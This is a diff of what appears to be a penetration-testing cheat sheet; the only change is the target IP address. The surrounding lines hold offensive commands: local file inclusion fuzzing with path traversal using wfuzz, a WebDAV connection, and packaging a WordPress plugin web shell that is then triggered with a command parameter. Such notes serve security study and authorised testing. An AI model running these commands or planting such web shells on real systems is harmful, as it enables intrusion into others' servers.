@@ -28,10 +28,10 @@ Linux LFI file directories
 https://github.com/hussein98d/LFI-files
 
 Then use the list to find out which ones work:
-$ wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt
+$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt
 
 Find out how many characters a wrong request is, then filter those out:
-$ wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
+$ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
 ```
 
 ###### Apache Log Poisoning
@@ -50,7 +50,7 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 ###### WebDAV
 ```
-$ cadaver http://10.10.10.10/
+$ cadaver http://192.168.1.1/
 ```
 
 ###### Wordpress Panel
@@ -61,7 +61,7 @@ $ cp /usr/share/seclists/Web-Shells/Wordpress/plugin-shell.php ./
 $ zip plugin-shell.zip plugin-shell.php
 
 Upload the ZIP as a plugin. Then run the webshell:
-$ curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
+$ curl http://192.168.1.1/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
 ```
 
 ###### Example changing a wordpress password in MariaDB
